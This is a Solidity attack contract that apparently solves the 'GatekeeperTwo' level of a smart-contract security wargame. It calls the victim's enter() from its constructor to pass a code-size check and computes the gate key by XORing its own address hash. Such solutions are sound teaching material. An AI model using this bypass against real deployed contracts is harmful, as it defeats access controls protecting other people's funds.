// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './GatekeeperTwo.sol';

contract AttackGatekeeperTwo{
    GatekeeperTwo immutable victim;

    constructor(GatekeeperTwo _victim) {
        victim = _victim;

        // to pass the gateTwo, we call the enter function in constructor
        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max);
        victim.enter(_gateKey);
    }
}